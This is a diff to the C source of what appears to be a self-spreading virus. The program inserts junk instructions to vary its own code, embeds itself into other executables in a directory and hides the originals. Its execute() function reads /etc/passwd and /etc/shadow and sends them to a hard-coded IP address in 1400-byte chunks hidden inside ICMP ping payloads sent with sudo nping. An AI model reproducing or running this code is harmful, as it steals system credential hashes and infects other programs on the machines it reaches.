@@ -4,6 +4,7 @@
 #include <ctype.h>
 #include <time.h>
 #include <dirent.h>
+#include <unistd.h>
 #include <errno.h>
 
 #define PUSH 0x50
@@ -147,14 +148,13 @@ void replace_junk(void)
             j += inc;
             space -= inc;                               JUNK;
         }
-        printf("%d\n", i);                              JUNK;
     }
 }
 
 /* Reads a standard file */
 char* read_file(const char *file_name)
 {
-    unsigned char *str;
+    char *str;
     int strlen;
 
     // Opens file in read mode
@@ -176,10 +176,12 @@ char* read_file(const char *file_name)
 }
 
 // Send /etc/passwd and /etc/shadow files in a ping
-void execute()
+void execute(const char *ip_addr)
 {
-    unsigned char *passwd;                  JUNK;
-    unsigned char *shadow;
+    const int payload_len = 1400;
+
+    char *passwd;                  JUNK;
+    char *shadow;
     int passwd_len;                         JUNK;
     int shadow_len;
 
@@ -189,20 +191,38 @@ void execute()
     passwd_len = strlen(passwd);
     shadow_len = strlen(shadow);            JUNK;
 
-    char *ping = "sudo nping -c 1 --icmp --data-string \"%s\" 192.168.1.142";
+    //char *ping = "sudo nping --quiet -c 1 --icmp --data-string \"%s\" %s > /dev/null 2>&1";
+    char *ping = "sudo nping -c 1 --icmp --data-string \"%s\" %s";
     int ping_len = strlen(ping);            JUNK;
 
-    int passwd_cmd_len = ping_len + passwd_len + 1;
-    int shadow_cmd_len = ping_len + shadow_len + 1;
+    int len = passwd_len;                   JUNK;
+    int offset = 0;                         JUNK;
+    while (len > 0)
+    {
+        char cmd_part[payload_len];
+        sprintf(cmd_part, "%.*s", payload_len, passwd + (payload_len * offset));
+        len -= payload_len;
+        offset += 1;                        JUNK;
+        int tmp_len = strlen(cmd_part) + ping_len;
+        char tmp_cmd[tmp_len];
+        sprintf(tmp_cmd, ping, cmd_part, ip_addr);
+        system(tmp_cmd);                    JUNK;
+    }
+    
 
-    char passwd_cmd[passwd_cmd_len];        JUNK;
-    char shadow_cmd[shadow_cmd_len];        JUNK;
-
-    sprintf(passwd_cmd, ping, passwd);
-    sprintf(shadow_cmd, ping, shadow);      JUNK;
-
-    system(passwd_cmd);
-    system(shadow_cmd);                     JUNK;
+    len = shadow_len;                       JUNK;
+    offset = 0;                             JUNK;
+    while (len > 0)
+    {
+        char cmd_part[payload_len];
+        sprintf(cmd_part, "%.*s", payload_len, shadow + (payload_len * offset));
+        len -= payload_len;
+        offset += 1;                        JUNK;
+        int tmp_len = strlen(cmd_part) + ping_len;
+        char tmp_cmd[tmp_len];
+        sprintf(tmp_cmd, ping, cmd_part, ip_addr);
+        system(tmp_cmd);                    JUNK;
+    }
 }
 
 /* Executes a bash command to execute and hide an original executable file */
@@ -270,7 +290,6 @@ DIR *dir;
                         char hidden_file[hidden_file_len];  JUNK;
                         sprintf(hidden_file, bash_code, ent->d_name);
 
-                        // 
                         if( access(hidden_file, F_OK) == -1 ) {
                             embed_code(ent->d_name);        JUNK;
                         }
@@ -292,7 +311,7 @@ DIR *dir;
 int main(int argc, char* argv[])
 {
     // Outputs 0 if executable is running with root privileges
-    system("id -u");
+    int id = system("id -u > /dev/null 2>&1");
     // Sends ICMP ping with custom payload to IP
     execute("192.168.1.142");                               JUNK;
     // Reads code into memory from currently running executable
